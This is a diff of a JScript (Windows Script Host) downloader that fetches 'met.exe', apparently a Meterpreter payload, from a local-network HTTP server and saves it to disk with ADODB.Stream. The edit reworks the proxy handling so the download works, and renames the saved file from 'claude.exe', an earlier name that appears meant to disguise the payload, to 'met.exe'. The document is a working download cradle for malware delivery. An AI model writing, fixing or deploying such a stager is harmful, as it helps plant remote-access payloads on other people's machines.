@@ -1,18 +1,13 @@
-var url = "http://192.168.251.151/met.exe";
-var proxyServer = "http://your-proxy-server:8080"; // Can be empty, null, or "host:port"
-var proxyBypass = "localhost";
+var url = "http://192.168.19.128:8000/met.exe";
 
-var Object = WScript.CreateObject('MSXML2.ServerXMLHTTP');
+var proxyServer = "";
 
-// Apply proxy only if non-empty, otherwise use direct connection
+// Match exact working pattern - use MSXML2.XMLHTTP not ServerXMLHTTP
+var Object = WScript.CreateObject('MSXML2.XMLHTTP');
+
+// Only set proxy if provided
 if (proxyServer && proxyServer.trim() !== "") {
-    // SXH_PROXY_SET_PROXY = 2 (manual proxy)
-    Object.SetProxy(2, proxyServer.trim(), proxyBypass);
-    // Uncomment if proxy requires authentication
-    // Object.SetProxyCredentials("username", "password");
-} else {
-    // SXH_PROXY_SET_DIRECT = 1 (bypass proxy, connect directly)
-    Object.SetProxy(1);
+    Object.setOption(2, proxyServer.trim());
 }
 
 Object.Open('GET', url, false);
@@ -20,13 +15,15 @@ Object.Send();
 
 if (Object.Status == 200)
 {
+    // Match exact working Stream pattern
     var Stream = WScript.CreateObject('ADODB.Stream');
+
     Stream.Open();
     Stream.Type = 1;
     Stream.Write(Object.ResponseBody);
     Stream.Position = 0;
 
-    Stream.SaveToFile("claude.exe", 2);
+    Stream.SaveToFile("met.exe", 2);
     Stream.Close();
 }
 
